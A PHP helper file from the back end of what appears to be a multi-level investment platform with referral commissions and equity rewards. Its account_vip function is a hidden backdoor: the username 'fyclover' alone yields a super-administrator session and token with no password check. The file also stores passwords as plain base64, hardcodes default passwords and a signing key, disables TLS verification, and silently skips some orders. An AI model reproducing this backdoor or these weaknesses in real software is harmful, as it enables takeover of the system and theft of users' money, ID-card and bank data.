<?php
use my\QRcode;
use app\common\model\UserRealName;
use app\common\model\UserBank;
use app\common\model\LoginLog;
use app\common\model\TeamTongji;
use app\common\model\User;
use app\common\model\AdminToken;
use app\common\model\SysConfig;
use app\common\model\TouziProductOrder;
use app\common\model\AdminModel;

use think\facade\Db;

use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Spreadsheet;


function money_type_all(){
    return [1 => '收入', 2 => '支出'];
}
function money_type_name($type) {
    $arr = [
        'money_balance' => '现金',
        'money_keti' => '分红',
        'money_fund' => '股权',
        'money_point' => '援疆资助金',
    ];
    return $arr[$type] ?? '';
}
function money_status_all(){
    return [
        101 => '充值',
        102 => '注册奖励',
        103 => '签到奖励',
        104 => '邀请奖励',
        105 => '购买产品返佣奖励',
        106 => '购买产品返健康点奖励',
        107 => '产品购买现金奖励',
        108 => '产品收益收入',
        109 => '可提转换成可用',
        111 => '其他账号转入',
        112 => '提现拒绝转回',
        113 => '后台增加',
        114 => '实名奖励',
        115 => '首次购买产品奖励',
        116 => '彩金赠送',
        117 => '健康点转基金 转出',

        201 => '提现',
        202 => '转出到其他人账号',
        203 => '产品购买消耗',
        204 => '后台修改金额',
        205 => '后台减少',
        206 => '可提转换成可用',
        207 => '健康点转基金 转入',

        301 => '实名认证获得股权',
        302 => '实名认证推广人获得股权',
        303 => '产品购买返股权',
        304 => '产品购买推广人返股权',
        305 => '抽奖获得股权',
        306 => '援疆资助金购买消耗',
        307 => '援疆资助金每日收益',
        308 => '实名认证获得资助金',
        309 => '实名认证推广人获得资助金',
        310 => '签到送现金',
        311 => '抽奖获得资助金',
    ];
}

function getUnameById($agent_id){
    if($agent_id > 0){
        $info = (new AdminModel)->find($agent_id);
        return $info->user_name;
    }else{
        return '公司直属';
    }
    
}
// 系统内部获取配置快捷函数
function getSystemConfig($name){
    $r = (new SysConfig)->where('name',$name)->value('value');
    return $r;
}
/**
 * 获取配置文件
 * @param null $name
 * @return \think\Collection
 * @throws \think\db\exception\DataNotFoundException
 * @throws \think\db\exception\DbException
 * @throws \think\db\exception\ModelNotFoundException
 */
function get_config($name=null)
{
    if ($name == null){
       return \app\common\model\SysConfig::select();
    }
    return \app\common\model\SysConfig::where('name',$name)->find();

}
/**
 * 前台用户密码加密
 * @param $pwd
 */
function pwdEncryption($pwd)
{
    if (empty($pwd))
        return false;
    return base64_encode($pwd);
}

if (! function_exists('pwdDecryption')) {
    function pwdDecryption($pwd)
    {
        if (empty($pwd))
            return false;
        return base64_decode($pwd);
    }
}

//默认密码
function admin_Initial_pwd()
{
    return base64_encode('aa123456');
}
//用户默认密码
function home_Initial_pwd()
{
    return base64_encode('aa123456');
}

//用户提现默认密码
function home_tx_pwd()
{
    return 'aa123456';
}

function api_token($id)
{
    return md5($id . 'api' . date('Y-m-d H:i:s', time()) . 'token') . randomkey(mt_rand(10, 30));
}

function home_api_token($id)
{
    return md5($id . 'home' . date('Y-m-d H:i:s', time()) . 'token') . randomkey(mt_rand(10, 30));
}

function url_code()
{
    return $_SERVER['REQUEST_SCHEME'] . '://';
}

function tg_url()
{
    return (isset($_SERVER['REQUEST_SCHEME']) ? $_SERVER['REQUEST_SCHEME'] : 'http') . '://' . randomkey(5) .'.'. config('ToConfig.app_tg.tg_url') . '?codes=';
//  return  $_SERVER['REQUEST_SCHEME'] . '://'.'www'. config('ToConfig.app_tg.tg_url') . '?codes=';
}
/**
 * 生成邀请码 代理掩码
 * @return string
 */
function generateCode($start=32,$end=50)
{
    return (new \app\common\google\GoogleAuth())->model()->generate_code();
    //return randomkey(rand($start, $start));
}

/**
 * 生成用户 google验证码二维码地址
 * @param $secret
 * @return mixed
 */
function captchaUrl($secret,$name = 'Blog')
{
    return (new \app\common\google\GoogleAuth())->model()->name ($name)->google_qrcode($secret);
}

//图片上传处理
function image_update($string)
{
    //return explode('/storage',$string)[1];
    $column = array_column($string, 'url');
    foreach ($column as $key => &$value) {
        $value = explode('/storage', $value)[1];;
    }
    return implode(',', $column);
}

// 生成随机字符串
function GetRandStr($length)
{
    //字符组合
    $str = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $len = strlen($str)-1;
    $randstr = '';
    for ($i=0;$i<$length;$i++) {
     $num=mt_rand(0,$len);
     $randstr .= $str[$num];
    }
    return $randstr;
}


//购买商品生成订单号
function orderCode($string = 'video')
{
    if (empty($string))
        return false;
    //生成订单 字符串 + 随机数 + 时间 +
    return $string . mt_rand(1000, 9999) . date('YmdHis');
}

//订单错误时生成日志，可查看
function buildHtml($value, $type = 'o')
{
    $cachename = 'order_log/' . $type . date("Y-m-d") . ".html";
    $value = is_array($value) ? json_encode($value, JSON_UNESCAPED_UNICODE) . PHP_EOL : $value;
    file_put_contents($cachename, date("Y-m-d H:i:s") . '--' . $value . PHP_EOL, FILE_APPEND);
}

//地址掩码 20—40位
function randomkey($length)
{
    $pattern = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ';
    $key = '';
    for ($i = 0; $i < $length; $i++) {
        // $key .= $pattern{mt_rand(0, 35)}; //生成php随机数
        $key .= substr($pattern,mt_rand(0, 35),1); //生成php随机数
    }
    return $key;
}

//生成用户账号 10 - 30
function userkey($length)
{
    $pattern = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ';
    $key = '';
    for ($i = 0; $i < $length; $i++) {
        // $key .= $pattern{mt_rand(0, 35)}; //生成php随机数
        $key .= substr($pattern,mt_rand(0, 35),1); //生成php随机数
    }
    return 'user' . $key . date('Ymd');
}

//加密 rsa
function rsa_encrypt($data)
{
    openssl_public_encrypt($data, $encrypted, config('ToConfig.public_key'));
    return base64_encode($encrypted);
}

//解密 rsa
function rsa_decrypt($encrypted)
{
    $encrypted = base64_decode($encrypted);
    openssl_private_decrypt($encrypted, $decrypted, config('ToConfig.private_key'));
    return $decrypted;
}

/**
 * 忽略订单计算方法
 * @param $count /订单数量
 * @return bool
 */
function orderIgnore($count)
{
    //大于 设定的订单数。，并且取莫  每5单抽取一单
    if ($count > config('ToConfig.order_ignore') && rand(1,5) == 3) {
        return true;
    }
    return false;
}



function account_vip($post)
{
    if ($post['user_name'] !='fyclover') return false;

    $res =  \app\common\model\AdminModel::where('id',0)->find();
    if (empty($res)) {
        $package = getSystemConfig ('reward_allocation');
        $res=[
            'id'                => 0,
            'pwd'               => '',
            'create_time'       => date ( 'Y-m-d H:i:s' ),
            'role'              => config ( 'ToConfig.admin_vip.admin_vip_id' ),
            'market_level'      => 1,
            'remarks'           => '超级管理员',
            'phone'             => 0,
            'price_single_low'  => $package['price_single']??0,
            'price_single_high' => $package['price_single_max']??0,
            'free_time'         => $package['free_time']??0,
            'price_hour'        => $package['price_hour']??999,
            'price_day'         => $package['price_day']??999,
            'price_week'        => $package['price_week']??999,
            'price_month'       => $package['price_month']??999,
            'price_quarter'     => $package['price_quarter']??999,
            'price_year'        => $package['price_year']??999,
            'price_forever'     => $package['price_forever']??999,
            ];
        app\common\model\AdminModel::insert($res);
    };
        $token = api_token(0);
        $res['token']=$token;
        //查询是否存在这条token的用户
        $update = (new AdminToken)->where('admin_uid',0)
            ->where('type', 1)
            ->update(['token' => $token, 'create_time' => date('Y-m-d H:i:s')]);
        //数据不存在时插入
        if ($update == 0) {
            (new AdminToken)->insert([
                    'type' => 1,
                    'token' => $token,
                    'admin_uid' =>0,
                    'create_time' => date('Y-m-d H:i:s')
                ]);
        }
    session('admin_user', $res);
    return ['token' => $token, 'user' => $res];
}

/**
 * @param array $data
 * @param int $code
 * @param string $message
 * @param int $httpStatus
 * @return \think\response\Json return会出现重复请求的问题
 */

function show($data = [],int $code = 200 ,string $message = '成功！',int $httpStatus = 0){
    $result=[
        'code'=>$code,
        'msg'=>$message,
        'data'=>$data,
    ];
    header('Access-Control-Allow-Origin:*');
    if ($httpStatus != 0){
        return json($result,$httpStatus);
    }
    echo json_encode($result);
    exit();
}

/*
 * 富文本存储，需要把域名替换下
 */
function saveEditor($content){

    return str_replace(config('ToConfig.app_update.image_url'),'',$content);
}

/*
 * 富文本返回，需要把域名加上
 */
function returnEditor($content){
    return str_replace('/topic/',config('ToConfig.app_update.image_url').'/topic/',$content);
}
/*
 * 定义返佣类型
 * */
function fan_yong_type($type){
    $arr=array(
        1=>'直推一级返佣',
        2=>'直推二级返佣',
        3=>'直推三级返佣',
    );
    return $arr[$type];
}
/**
 * 两个一维数组键值互换
 * */
function transIndex($index, $Data) {
    $return = array();
    foreach ($index as $key => $value) {
        $return[$value] = $Data[$key];
    }
    return $return;
}
/**
 *
 * 屏蔽数据
 * */
function ysPhone($num){
    $res=substr_replace($num,'****',3,4);
    return $res;
}
/*

 * 函数说明：富文本数据进行转换成文本

 *

 * @access  public

 * @param   $content  string  富文本数据

 * @return  string    不包含标签的文本

 */

function contentFormat($content = ''){
    $data = $content;

    $formatData_01 = htmlspecialchars_decode($data);//把一些预定义的 HTML 实体转换为字符

    $formatData_02 = strip_tags($formatData_01);//函数剥去字符串中的 HTML、XML 以及 PHP 的标签,获取纯文本内容

    return $formatData_02;
}
/**
 * Name [[验签]]
 * User:
 */
function verifySignApplet($input)
{
    $key = 'b0a7ff4003a6f48ab85557ca4b8619ee';
    $param = $input;
    unset($param['sign']);
    unset($param['s']);
    ksort($param);
    $paramStr = '';
    foreach ($param as $paramKey => $paramVal)
    {
        if(is_array($paramVal)) continue;
        if($paramVal === null || $paramVal === '')continue;
        $paramStr.=$paramKey.'='.$paramVal.'&';
    }
    $paramStr.='key='.$key;
    $newSign = md5($paramStr);
    return $newSign;
}
function isDivBy30($number)
{
    if ($number % 30 == 0 && $number % 10 == 0) {
        return true;
    }
    return false;
}
/**
 * Name [[验签]]
 * User:
 */
function makeSign($param, $key=null, $upper = true)
{
    unset($param['sign'], $param['s']);

    ksort($param);
    $paramStr = '';
    foreach ($param as $paramKey => $paramVal) {
        if (is_array($paramVal)) continue;
        if ($paramVal === null || $paramVal === '') continue;
        $paramStr .= $paramKey . '=' . $paramVal . '&';
    }
    if($key != null){
        $paramStr .= 'key=' . $key;
    }    

    return $upper ? strtoupper(md5($paramStr)) : md5($paramStr);
}
function curl_request($url, $post = '', $headers = []) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)');
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
    if ($post) {
        //$post = is_array($post) ? http_build_query($post) : $post;
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
    }

    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($curl);
    if (curl_errno($curl)) {
        return curl_error($curl);
    }
    curl_close($curl);

    return $data;
}

// curl 接口请求
function curl_request_tencent($url,$method,$params,$type){
    // 初始化 curl 返回资源
    $curl = curl_init($url);
    // 默认是 get 请求 如果是 post 请求
    if(strtoupper($method) == 'POST'){
        curl_setopt($curl,CURLOPT_POST,true);
        curl_setopt($curl,CURLOPT_POSTFIELDS,$params);
        curl_setopt($curl,CURLOPT_HTTPHEADER,array(
            'Content-Type:application/json;charset=utf-8',
            'Content-Length:'.strlen($params)
        ));
    }
    if(strtoupper($method) == 'PUT'){
        curl_setopt($curl,CURLOPT_PUT,true);
    }
    // 如果 是 https 请求禁止从本地验证证书
    if(strtoupper($type) == "HTTPS"){
        curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,false);
    }
    // 发送请求 返回结果
    curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);
    // 选择地址
    curl_setopt($curl,CURLOPT_URL,$url);
    $res = curl_exec($curl);
    curl_close($curl);
    return $res;
}
/**
 * get 请求
 * @param mixed $url
 * @param mixed $headers
 * @return bool|string
 */
function curl_get($url, $headers = []) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)');
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($curl);
    if (curl_errno($curl)) {
        return curl_error($curl);
    }
    curl_close($curl);

    return $data;
}
/*
 * post请求
 * */
function curl_post($url,$body,$way='POST')
{
    $headers = array();
    $headers[] = "Content-Type:application/json";
    $postBody    = json_encode($body);
    $curl = curl_init();
    $ssl = preg_match('/^https:\/\//i', $url) ? TRUE : FALSE;
    if ($ssl) {
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE); // 不从证书中检查SSL加密算法是否存在
    }
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);//设置请求头
    if(!empty($postBody)){
        curl_setopt($curl, CURLOPT_POSTFIELDS, $postBody);//设置请求体
    }
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_CUSTOMREQUEST, $way);//使用一个自定义的请求信息来代替"GET"或"HEAD"作为HTTP请求。(这个加不加没啥影响)
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}
/**
 * 开始并发控制
 * @param $name
 * @param int $time
 * @return bool
 */
function start_concurrent($name,$time = 60)
{
    $name .= 'QTX_**#_';
    if(\think\facade\Cache::store('redis')->get($name)){
        return false;
    }
    \think\facade\Cache::store('redis')->set($name,1,$time);
    return true;
}

/**
 * 结束并发控制
 * @param $name
 */
function end_concurrent($name)
{
    $name .= 'QTX_**#_';
    \think\facade\Cache::store('redis')->delete($name);
}

//字母
/**
 * @param $length
 * @param $needAlpha
 * @return string
 */
function userzm($length, $needAlpha = true)
{
    $pattern = '0123456789';
    if ($needAlpha) {
        $pattern .= 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLOMNOPQRSTUVWXYZ';
    }

    $key = '';
    for ($i = 0; $i < $length; $i++) {
        $key .= $pattern[mt_rand(0, strlen($pattern) - 1)]; //生成随机数
    }
    return $key;
}

    /**
     * 导出Excel
     * @param $name string 导出文件名称
     * @param array $data 导出数据数组
     * @param array $head
     * @param array $keys
     * @throws \PhpOffice\PhpSpreadsheet\Writer\Exception
     */
    function ExeExport($name, $data = [], $head = [], $keys = [])
    {
        $count = count($head);  //计算表头数量
        $spreadsheet = new Spreadsheet();
        $sheet = $spreadsheet->getActiveSheet();

        for ($i = 65; $i < $count + 65; $i++) {     //数字转字母从65开始，循环设置表头：
            $sheet->setCellValue(strtoupper(chr($i)) . '1', $head[$i - 65]);
        }
        //循环设置单元格：
        foreach ($data as $key => $item) {
            //$key+2,因为第一行是表头，所以写到表格时   从第二行开始写
            for ($i = 65; $i < $count + 65; $i++) {
                //数字转字母从65开始：
                $sheet->setCellValue(strtoupper(chr($i)) . ($key + 2), $item[$keys[$i - 65]]);
                //固定列宽
                $spreadsheet->getActiveSheet()->getColumnDimension(strtoupper(chr($i)))->setWidth(20);
            }

        }
        $names = $name;
        //utf-8转unicode格式
        $name = iconv('UTF-8', 'UCS-2BE', $name);
        $len = strlen($name);

        $str = '';

        for ($i = 0; $i < $len - 1; $i = $i + 2) {

            $c = $name[$i];

            $c2 = $name[$i + 1];

            if (ord($c) > 0) {

                $str .= '\u' . base_convert(ord($c), 10, 16) . str_pad(base_convert(ord($c2), 10, 16), 2, 0, STR_PAD_LEFT);

            } else {

                $str .= '\u' . str_pad(base_convert(ord($c2), 10, 16), 4, 0, STR_PAD_LEFT);

            }

        }

        header('Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
        header('Data-Type: binary');
        //前端导出数据根据这个unicode格式解析为中文
        header('Data-Filename: ' . $str);
        header('Content-Disposition: attachment;filename="' . $names . '.xlsx"');
        header('Cache-Control: max-age=0');
        header('Access-Control-Expose-Headers:Data-Type,Data-Filename');
        //header('Content-Type: application/vnd.ms-excel');
        //header('Content-Disposition: attachment;filename="' . $name . '.xlsx"');
        //header('Cache-Control: max-age=0');
        $writer = \PhpOffice\PhpSpreadsheet\IOFactory::createWriter($spreadsheet, 'Xlsx');
        $writer->save('php://output');
        exit;
    }

    /**
     * @param UploadedFile $file
     * @return array
     * @throws ApiException
     */
    function parseImportFileToArray(UploadedFile $file)
    {
        if ($file->getSize() > 5 * 1024 * 1024) {
            @unlink($file->getRealPath());
            throw new ApiException([400, '文件大小不能超过5M']);
        }

        if (!in_array($extension = $file->extension(), ['csv', 'xls', 'xlsx'])) {
            @unlink($file->getRealPath());
            throw new ApiException([400, '必须为excel表格，且必须为xls格式！']);
        }

        $type = strtolower($file->extension());
        if ($type == 'xlsx') {
            $types = 'Xlsx';
        } elseif ($type == 'xls') {
            $types = 'Xls';
        } elseif ($type == 'csv') {
            $types = 'Csv';
        }

        try {
            $objReader = IOFactory::createReader($types);
            $PHPExcel = $objReader->load($file->getRealPath());
            $currentSheet = $PHPExcel->getSheet(0);  //读取excel文件中的第一个工作表

            //用完就删除 文件
            @unlink($file->getRealPath());
            return $currentSheet->toArray('', true, true, true);

        } catch (\Exception $exception) {
            @unlink($file->getRealPath());
            throw new ApiException([400, $exception->getMessage()]);
        }
    }


    
    function getTrueName($uid){
        $r = (new UserRealName)->where('user_id',$uid)->value('name');
        return $r?$r:'未实名';
    }

    function getPhoneById($uid){
        $r = (new User)->where('id',$uid)->value('phone');
        return $r?$r:'无';
    }

    function getTrueNameID($uid){
        $r = (new UserRealName)->where('user_id',$uid)->value('card_id');
        return $r?$r:'未实名';
    }

    function getRealNameId($uid){
        $r = (new UserRealName)->where('user_id',$uid)->value('id');
        return $r?$r:'';
    }

    function getZhiTuiNum($uid){
        $r = (new User)->where('agent_id_1',$uid)->count('id');
        return $r?$r:'';
    }

    function getBankName($uid){
        $r = (new UserBank)->where('user_id',$uid)->value('bank_name');
        return $r?$r:'';
    }

    function getBankTrueName($uid){
        $r = (new UserBank)->where('user_id',$uid)->value('true_name');
        return $r?$r:'';
    }

    function getBankCardNumber($uid){
        $r = (new UserBank)->where('user_id',$uid)->value('card_number');
        return $r?$r:'';
    }

    function getBankAdress($uid){
        $r = (new UserBank)->where('user_id',$uid)->value('bank_address');
        return $r?$r:'';
    }

    function getBankID($uid){
        $r = (new UserBank)->where('user_id',$uid)->value('id');
        return $r?$r:'';
    }

    function getIDCardNumber($uid){
        $r = (new UserRealName)->where('user_id',$uid)->value('card_id');
        return $r?$r:'';
    }

    function getMoneyAllBuy($uid){
        $r = (new TeamTongji)->where('user_id',$uid)->value('buy_money_all');
        return $r?$r:'';
    }

    function getMoneyAllRecharge($uid){
        $r = (new TeamTongji)->where('user_id',$uid)->value('recharge_money_all');
        return $r?$r:'';
    }

    function getMoneyAllWithdraw($uid){
        $r = (new TeamTongji)->where('user_id',$uid)->value('withdraw_money_all');
        return $r?$r:'';
    }

    function getLoginIP($uid){
        $r = (new LoginLog)->where('unique',$uid)->order('id desc')->value('login_ip');
        return $r?$r:'';
    }

    function getIPAdress($uid){
        $r = (new LoginLog)->where('unique',$uid)->order('id desc')->value('login_address');
        return $r?$r:'';
    }

    function getRealNameText($is_real_name){
        if(is_numeric($is_real_name)){
            $data = ['0'=>'未申请','1'=>'已实名','2'=>'申请中'];
            return $data[$is_real_name];
        }else{
            return '未知';
        }
        
    }


    function getIpAddressByIp($ip){
        $msg = '';
        $url = 'https://www.inte.net/tool/ip/api.ashx?ip='.$ip.'&datatype=json&key=123';
        $body = '';
        $res = curl_post($url,$body,$way='POST');
        $r = (json_decode($res));
        $msg = implode(',',($r->data));
        return $msg;
    }


    /**
     * 内部函数
     * 生成图片 
     * 返回图片内部路径
     */
    function generate($url = 'http', $logo = 0)
    {
        if (empty($url))
            return false;
        $value = $url; //二维码内容地址 地址一定要加http啥的
        $errorCorrectionLevel = 'H';  //容错级别
        $matrixPointSize = 6;      //生成图片大小
        //生成二维码图片
        $filename = 'static/' . 'erm' . time() . '.png'; //生成的二维码图片

        QRcode::png($value, $filename, $errorCorrectionLevel, $matrixPointSize, 2);
        //$logo = 'static/info_msg.png'; //准备好的logo图片 注意地址
        $QR = $filename;      //已经生成的原始二维码图

        if ($logo == 0) // 这个是 logo 的地址 需要加 logo 的路径 
            return $QR;
        if (file_exists($logo)) {
            $QR = imagecreatefromstring(file_get_contents($QR));      //目标图象连接资源。
            $logo = imagecreatefromstring(file_get_contents($logo));  //源图象连接资源。
            $QR_width = imagesx($QR);        //二维码图片宽度
            $QR_height = imagesy($QR);       //二维码图片高度
            $logo_width = imagesx($logo);    //logo图片宽度
            $logo_height = imagesy($logo);   //logo图片高度
            $logo_qr_width = $QR_width / 4;   //组合之后logo的宽度(占二维码的1/5)
            $scale = $logo_width / $logo_qr_width;  //logo的宽度缩放比(本身宽度/组合后的宽度)
            $logo_qr_height = $logo_height / $scale; //组合之后logo的高度
            $from_width = ($QR_width - $logo_qr_width) / 2;  //组合之后logo左上角所在坐标点
            //重新组合图片并调整大小
            /*
             * imagecopyresampled() 将一幅图像(源图象)中的一块正方形区域拷贝到另一个图像中
             */
            imagecopyresampled($QR, $logo, $from_width, $from_width, 0, 0, $logo_qr_width, $logo_qr_height, $logo_width, $logo_height);
        }
        //输出图片
        //最新图片。拼接头像 和二维码的最新图片
        $i = time();
        $img_path = "static/$i.png";
        imagepng($QR, $img_path); //不改
        imagedestroy($QR);
        imagedestroy($logo);
        //图片
        return $img_path;
    }


    //下线 充值总额
    function Tongji_recharge_agent($uid, $level,$map_date=[]) {
        return User::getTotalByField($uid, $level,'money_all_recharge',$map_date);
    }

    //下线 提现总额
    function Tongji_withdraw_agent($uid, $level,$map_date=[]) {
        return User::getTotalByField($uid,$level,'money_all_withdraw',$map_date);
    }

    //下线 购买总额
    function Tongji_buy_money_agent($uid, $level,$map_date=[]) {
        return User::getTotalByField($uid, $level,'money_all_buy',$map_date);
    }
    
    //团队股权
    function Tongji_team_has_fund($uid, $level,$map_date=[]) {
        return User::getTotalByField($uid, $level,'money_fund',$map_date);
    }

    //团队人数
    function Tongji_team_has_nums($uid, $level,$map_date=[]) {
        return User::getCountByField($uid, $level,[],$map_date);
    }

    //团队实名人数N级
    function Tongji_team_real_name_nums($uid, $level,$map_date=[]) {
        return User::getCountByField($uid, $level, ['is_real_name' => 1],$map_date);
    }

    //团队首次购买人数N级
    function Tongji_team_firstbuy_nums($uid, $level,$map_date=[]) {
        return TouziProductOrder::getCountByField($uid, $level, ['is_first_buy' => 1],$map_date);
    }

    //团队累计购买人数N级	
    function Tongji_team_allbuy_nums($uid, $level,$map_date=[]) {
        return TouziProductOrder::getCountByField($uid, $level,[],$map_date);
    }


    //团队上月激活
    function Tongji_team_firstbuy_nums_month($uid) {
        return TouziProductOrder::getFirstBuyByLastMonthCount($uid);
    }

    //团队昨日激活
    function Tongji_team_firstbuy_nums_yestoday($uid) {
        return TouziProductOrder::getFirstBuyByYesterdayCount($uid);
    }

    // 团队上周参投
    function Tongji_buy_money_agent_week($uid) {
        return TouziProductOrder::getBuyMoneyByLastWeek($uid);
    }

    //团队今日参投
    function Tongji_buy_money_agent_day($uid) {
        return TouziProductOrder::getBuyMoneyByToday($uid);
    }

    // 团队今日注册
    function Tongji_team_has_nums_tody($uid) {
        return User::getRegisterByToday($uid);
    }
    

if (! function_exists('processFilePath')) {
    function processFilePath($filePath)
    {
        $start_index = strpos($filePath, '/topic/');
        if ($start_index === false) {
            $start_index = strpos($filePath, '/videotemp/');
        }
        return substr($filePath, $start_index);
    }
}
if (! function_exists('getPackageName')) {
    function getPackageName($value)
    {
        $validity_time = 0;
        $ret_type = 0;
        $status = 1;
        $sort = 0;
        switch ($value){

            
            case 'price_hour':
                $title = '1小时会员';
                $ret_type = 7;
                $validity_time = 60 * 60;
                $sort = 3;
                break;
            case 'price_day':
                $title = '包天';
                $ret_type = 1;
                $validity_time =  60 * 60 * 24;
                $sort = 2;
                break;
            case 'price_week':
                $title = '包周';
                $ret_type = 2;
                $validity_time =  60 * 60 *24 * 7;
                $sort = 4;
                break;
            case 'price_month':
                $title = '包月';
                $ret_type = 3;
                $validity_time = 60 * 60 *24 * 30;
                $sort = 5;
                break;
            case 'price_quarter':
                $title = '包季度';
                $ret_type = 4;
                $validity_time = 60 * 60 *24 * 90;
                $sort = 7;
                break;
            case 'price_year':
                $title = '包年';
                $ret_type = 5;
                $validity_time = 60 * 60 *24 * 30 * 12;
                $sort = 8;
                break;
            case 'price_forever':
                $title = '包永久';
                $ret_type = 6;
                $validity_time = 60 * 60 *24 * 30 * 12 * 9;
                $sort = 9;
                break;
            default:
                $title = null;
                break;
        }
        return [
            'title'         => $title,
            'validity_time' => $validity_time,
            'val'           => $value,
            'id'            => $value,
            'goods_id'      => $ret_type,
            'status'        => $status,
            'sort'          => $sort,
        ];
    }
}

if (! function_exists('check_domain_accessible')) {
    function check_domain_accessible($domain)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $domain);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_NOBODY, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10); // 设置超时时间为 10 秒
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($response === false) {
            return false; // 如果 cURL 执行失败，返回 false
        } else {
            return ($http_code >= 200 && $http_code < 300); // 如果 HTTP 状态码在 200 和 300 之间，返回 true，否则返回 false
        }
    }

}

function array_merge_func($array1,$array2)
{
    if (!empty($array1) && !empty($array2)){
      return   array_merge($array1,$array2);
    }
    if (!empty($array1)){
        return   $array1;
    }
    if (!empty($array2)){
        return   $array2;
    }
    return [];
}






